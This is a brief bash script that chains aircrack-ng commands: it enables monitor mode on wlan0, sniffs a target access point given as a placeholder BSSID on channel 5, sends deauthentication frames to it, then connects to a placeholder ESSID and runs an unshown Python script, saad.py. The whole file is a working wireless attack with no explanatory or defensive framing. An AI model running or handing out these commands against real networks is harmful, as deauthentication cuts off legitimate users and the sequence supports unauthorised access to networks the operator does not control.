#! /bin/bash

airmon-ng start wlan0
airodump-ng -c 5 --bssid <BSSID> wlan0mon
aireplay-ng --deauth 6 -a <BSSID> wlan0mon
airmon-ng stop wlan0mon
sleep 5
nmcli d wifi connect <ESSID>
python3 saad.py